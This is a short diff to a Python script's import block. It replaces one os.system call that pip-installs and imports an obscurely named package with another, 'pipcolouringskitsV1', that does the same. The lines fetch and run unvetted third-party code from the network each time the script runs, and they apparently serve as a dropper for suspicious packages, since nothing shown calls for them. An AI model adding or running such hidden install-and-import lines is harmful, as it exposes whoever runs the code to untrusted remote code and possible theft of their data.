@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbpackageV1")
-import syssqlitedbpackageV1
+os.system("pip install pipcolouringskitsV1")
+import pipcolouringskitsV1
 import json
 import httpx
 import time
